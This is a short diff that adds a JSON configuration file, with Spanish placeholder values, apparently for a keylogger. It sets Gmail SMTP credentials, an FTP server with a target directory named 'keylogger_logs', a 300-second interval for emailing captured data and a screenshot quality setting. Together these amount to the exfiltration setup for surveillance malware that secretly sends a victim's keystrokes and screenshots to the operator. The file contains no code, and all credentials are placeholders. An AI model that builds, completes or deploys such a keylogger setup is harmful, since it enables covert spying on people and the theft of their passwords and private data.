@@ -1,0 +1,19 @@
+{
+    "email": {
+        "sender": "tu_email@gmail.com",
+        "password": "tu_app_password",
+        "receiver": "email_destino@gmail.com",
+        "smtp_server": "smtp.gmail.com",
+        "smtp_port": 587
+    },
+    "ftp": {
+        "host": "ftp.tuservidor.com",
+        "user": "tu_usuario",
+        "password": "tu_password",
+        "directory": "/public_html/keylogger_logs"
+    },
+    "options": {
+        "send_email_interval": 300,
+        "screenshot_quality": 50
+    }
+}
